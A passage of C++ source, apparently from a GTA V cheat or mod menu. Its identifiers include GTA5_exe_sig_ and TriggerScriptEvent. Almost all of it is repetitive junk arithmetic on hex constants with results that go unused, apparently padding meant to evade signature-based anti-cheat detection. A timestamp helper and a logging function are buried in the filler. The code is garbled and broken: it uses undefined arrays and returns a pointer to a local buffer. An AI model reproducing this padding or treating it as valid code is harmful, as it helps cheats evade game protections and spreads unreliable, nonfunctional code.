			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			struct tm current_tm;
			char chLogBuff[5000];
			char chParameters[5000];
			time_t current_time = time(NULL);
			localtime_s(&current_tm, &current_time);
			char szTimestamp[30];
			sprintf_s(szTimestamp, "[%02d:%02d:%02d] = ", current_tm.tm_hour, current_tm.tm_min, current_tm.tm_sec);
			return szTimestamp;
		}
		void Log_ERRO(string texto)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
